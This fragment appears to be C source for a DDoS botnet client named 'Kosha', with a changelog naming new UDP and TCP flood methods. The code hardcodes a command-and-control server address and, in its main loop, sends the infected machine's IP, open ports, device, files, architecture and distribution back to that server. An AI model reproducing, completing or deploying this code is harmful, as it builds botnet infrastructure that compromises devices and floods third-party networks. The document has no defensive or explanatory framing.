...
Added New Layer4 UDP Methods Including ["HOME", "RAID"]
Added New Layer4 TCP Methods Including ["TCP-CRI", "TCP-ZACH", "STOMP"]
...
unsigned char *commServer[] = {"188.166.17.7:23"}; 
int initConnection();
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(mainCommSock, "[Kosha] Marking -> [%s] -> [%s] -> [%s] -> [%s] -> [%s] -> [%s]", inet_ntoa(ourIP), getPortz(), getDevice(), getFiles(), getArch(), getDistro());
                char commBuf[4096];
                int got = 0;
                int i = 0;
